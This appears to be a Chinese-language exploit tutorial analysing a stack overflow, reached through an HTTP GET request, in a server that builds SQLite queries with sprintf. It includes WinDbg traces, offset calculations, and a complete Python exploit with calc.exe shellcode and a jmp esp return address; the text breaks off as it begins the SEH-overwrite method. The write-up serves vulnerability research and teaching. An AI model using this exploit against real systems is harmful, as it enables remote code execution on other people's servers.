
```
.text:00497745                 push    edi
.text:00497746                 push    eax
.text:00497747                 push    ecx
.text:00497748                 push    offset aSelectFromSWhe ; "select * from %s where %s='%s'"
.text:0049774D                 push    edx             ; char *
.text:0049774E                 call    _sprintf
```

我们看看最后拼接的语句：`bp 00497745`

第一次断下来，我们执行到 `sprintf` 函数，看看栈上的参数：

```
0:005> dd esp
02055f9c  02055fd4 005a283c 013746c0 01374670
02055fac  0154249c ffffffff 02057228 00001107
02055fbc  013746c0 01374670 00000000 00000000
02055fcc  00000000 01375900 656c6573 2a207463
02055fdc  6f726620 7173206d 6261746c 6c20656c
02055fec  74696d69 00003120 00000000 00000000
02055ffc  00000000 00000000 00000000 00000000
0205600c  00000000 00000000 00000000 00000000
0:005> dc 02055fd4  //格式化第一个参数即，目的地址
02055fd4  656c6573 2a207463 6f726620 7173206d  select * from sq
02055fe4  6261746c 6c20656c 74696d69 00003120  ltable limit 1..
02055ff4  00000000 00000000 00000000 00000000  ................
02056004  00000000 00000000 00000000 00000000  ................
02056014  00000000 00000000 00000000 00000000  ................
02056024  00000000 00000000 00000000 00000000  ................
02056034  00000000 00000000 00000000 00000000  ................
02056044  00000000 00000000 00000000 00000000  ................
0:005> dc 0154249c  //sprintf最后一个参数
0154249c  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA
015424ac  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA
015424bc  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA
015424cc  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA
015424dc  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA
015424ec  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA
015424fc  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA
0154250c  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA
```

这么长的畸形字符串复制到栈上，使用 `sprintf` 格式化前有进行加成，这就造成栈溢出了。

看看确实拼接成 SQL 语句了：

```
0:005> dc 02055fd4
02055fd4  656c6573 2a207463 6f726620 7173206d  select * from sq
02055fe4  6261746c 7720656c 65726568 6d616e20  ltable where nam
02055ff4  41273d65 41414141 41414141 41414141  e='AAAAAAAAAAAAA
02056004  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA
02056014  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA
02056024  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA
02056034  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA
02056044  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA
```

最后拿去给 `sqlite3.dll` 处理的时候造成异常。

具体路径如下，`sprintf` 执行完下一条语句是调用 `sub_4968D0` 函数：

`sub_4968D0` -> `sqlite3_prepare_v2` -> `sqlite3LockAndPrepare` -> `sqlite3SafetyCheckOk`（在这函数里面异常）

那么 `0154249c` 上的畸形字符串哪里来，来源于 `sub_52DF03` 函数的 `memcpy` 函数的复制。

# 漏洞利用

## 试试覆盖返回地址

作者使用的是覆盖 SEH 的方法，那是不是只能覆盖 SEH 呢？（是不是没执行到 `ret` 指令程序就崩溃掉了呢）

我们看看返回地址有多远：

`char v15; // [sp+20h] [bp-100Ch]@3`

我们要溢出的 `buf` 距离 `ebp` 都有 `0x100c`，即 4108 个字节。

当然函数这里没有生成栈帧。

那我们看看触发异常获取栈上 `02057058` 的值：

```
>>> hex(0x02057058- 0x02055fd4)
'0x1084'
```

那是可以覆盖返回地址的，我们尝试用 4150 个 A：

`!mona pattern_create 4150`

```
0:005> g
......
(c7c.738): Access violation(c7c.738): Access violation - code c0000005 (first chance)
- code c0000005 (first chance)
......
eax=00000000 ebx=00001007 ecx=34664633 edx=005aae28 esi=02057228 edi=ffffffff
eip=38664637 esp=02056ff0 ebp=02057624 iopl=0         nv up ei pl nz ac po nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010212
eax=00000000 ebx=00001007 ecx=34664633 edx=005aae28 esi=02057228 edi=ffffffff
eip=38664637 esp=02056ff0 ebp=02057624 iopl=0         nv up ei pl nz ac po nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010212
38664637 ??              ???
```

计算一下：

`!mona pattern_offset 0x38664637`

地址是 4073（为什么比 `v15` 距离 `ebp` 的 4180 字节要小呢，因为前面还有 SQL 语句的长度啊，O(∩_∩)O哈哈~）

但是下面的 `payload` 没起作用，服务器也没崩，调试也正常返回了：

`buff = "A" * 4073 + jmp_esp + "\x90" * 20 + shellcode`

那为什么之前 `eip` 会是 `0x38664637` 呢？

跟踪一下看看，确实会 `retn` 到 `0x38664637`。

是不是我们的 `payload` 有什么问题呢？

通过调试进一步排查，是触发了异常，也是一开始我们所看到的异常。

我们向前回溯看看这个 `eax` 的值来源于 `02057058`，值是 `391c5a09`：

```
0:005> g
Breakpoint 2 hit
eax=02055fd4 ebx=00001101 ecx=02057058 edx=02055fac esi=02057058 edi=0154247c
eip=004968ec esp=02055f8c ebp=02057624 iopl=0         nv up ei pl nz na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
fsws+0x968ec:
004968ec 8b01            mov     eax,dword ptr [ecx]  ds:0023:02057058=391c5a09
```

我们再看看我们的 `shellcode`，从倒数第二个字节起向前数 4 个字节，刚好是 `0x391c5a09`，那说明是我们的 `shellcode` 过长，覆盖到了上一函数栈帧的数据，导致异常的发生：

```
shellcode = (
"\xd9\xcb\xbe\xb9\x23\x67\x31\xd9\x74\x24\xf4\x5a\x29\xc9"
"\xb1\x13\x31\x72\x19\x83\xc2\x04\x03\x72\x15\x5b\xd6\x56"
"\xe3\xc9\x71\xfa\x62\x81\xe2\x75\x82\x0b\xb3\xe1\xc0\xd9"
"\x0b\x61\xa0\x11\xe7\x03\x41\x84\x7c\xdb\xd2\xa8\x9a\x97"
"\xba\x68\x10\xfb\x5b\xe8\xad\x70\x7b\x28\xb3\x86\x08\x64"
"\xac\x52\x0e\x8d\xdd\x2d\x3c\x3c\xa0\xfc\xbc\x82\x23\xa8"
"\xd7\x94\x6e\x23\xd9\xe3\x05\xd4\x05\xf2\x1b\xe9\x09\x5a"
"\x1c\x39\xbd"
)
```

那怎么解决？

1. 使用短一点的 `shellcode`，这样无疑对我们的攻击有很大的限制。
2. 由于前面我为了保险使用了长的 `nop`，由于是 `retn 0xC`，12 个 `\x90` 就行了，这样我们的 `shellcode` 应该也可以起作用。

对于第二点，我发现过短了：

`buff = "A" * 4073 + jmp_esp + "\x90" * 12 + shellcode`

调试发现没有复制 `0154249c` 的 `0x41414141`。

而且也不是 `where name`，应该后面的数据影响了：

```
0:005> dc 020560f0
020560f0  656c6573 2a207463 6f726620 7173206d  select * from sq
02056100  6261746c 7720656c 65726568 65737520  ltable where use
02056110  3d646972 00002727 00000000 00000000  rid=''
```

在后面加 3 个 `\x90` 就会异常。

最后排查测试，这样是可以执行 `jmp esp` 的：

`buff = "A" * 4073 + jmp_esp`

那我们在后面搞个先前跳转不就行了？

最终 `exp`：

```
# Usage: ./exploit.py ip port
import socket
import sys

host = str(sys.argv[1])
port = int(sys.argv[2])
a = socket.socket()
print "Connecting to: " + host + ":" + str(port)
a.connect((host,port))

# calc.exe
# Bad Characters: \x20 \x2f \x5c
shellcode = (
"\xd9\xcb\xbe\xb9\x23\x67\x31\xd9\x74\x24\xf4\x5a\x29\xc9"
"\xb1\x13\x31\x72\x19\x83\xc2\x04\x03\x72\x15\x5b\xd6\x56"
"\xe3\xc9\x71\xfa\x62\x81\xe2\x75\x82\x0b\xb3\xe1\xc0\xd9"
"\x0b\x61\xa0\x11\xe7\x03\x41\x84\x7c\xdb\xd2\xa8\x9a\x97"
"\xba\x68\x10\xfb\x5b\xe8\xad\x70\x7b\x28\xb3\x86\x08\x64"
"\xac\x52\x0e\x8d\xdd\x2d\x3c\x3c\xa0\xfc\xbc\x82\x23\xa8"
"\xd7\x94\x6e\x23\xd9\xe3\x05\xd4\x05\xf2\x1b\xe9\x09\x5a"
"\x1c\x39\xbd"
)

jmp_esp = "\x8b\x1c\xa0\x71" #0x71A01C8B jmp esp -> from wshtcpip.dll

buff = shellcode + "\x90" * (4073-len(shellcode)) + jmp_esp + "\x90" * 12 + "\xE9\x02\xf0\xff\xff"
print len(shellcode)

# GET
a.send("GET " + buff + " HTTP/1.0\r\n\r\n")
a.close()
print "Done..."
```

当然你也可以将 `shellcode` 改为弹窗的（注可能有些 `shellcode` 不能执行，有些位置的某些字符可能影响程序的执行流程或者 sql 查询的结果）。

下面看看我们弹窗效果：

![](https://bbs.kanxue.com/upload/attach/201703/748441_2p2bdjn1rwdwybp.png)
![这里写图片描述]()

那使用覆盖 SEH 是不是没遇到这么多麻烦呢？

## 覆盖SEH

首先定位 SEH：

```
0:005> !exchain
02056fd4: 46356646
Invalid exception stack at 34664633
```

```
Address=0BADF00D Message= - Pattern 3Ff4 (0x34664633) found in Metasploit pattern  at position 4061
```

可以看到位置为 4061，跟作者的 `exp` 写的是一样的，但这里是 `NEXT SEH` 的位置而已哦。

我们先看看作者的思路。
